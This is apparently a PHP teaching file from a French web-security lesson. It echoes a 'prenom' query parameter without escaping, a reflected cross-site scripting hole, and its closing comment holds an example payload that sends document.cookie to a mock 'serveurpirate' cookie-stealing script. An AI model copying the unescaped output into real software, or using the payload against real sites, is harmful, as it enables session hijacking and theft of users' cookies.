<?php
    session_start();
    if(isset($_SESSION['username'])){
        echo $_SESSION['username'];
    }else{
        echo 'ouvrir la page "set.php" pour activer la session';
    }
    

    // $cookie = $_COOKIE['PHPSESSID'];
    // print_r($cookie);exit();
?>

    <form method="get">
        <input type="text" name="prenom">
        <button>Valider</button>
    </form>

    <?php
    if(isset($_GET['prenom'])){
        $prenom = $_GET['prenom'];
        echo "Bonjour $prenom";
    }
    ?>

<!-- pour recuperer le fichier cookies 
// 'vol_cookie.php?cookie='+document.cookie;
//exemple de script : 
//<script>window.location='http://localhost/securite_php/_serveurpirate/vol_cookie_2.php?cookie='+document.cookie;</script> -->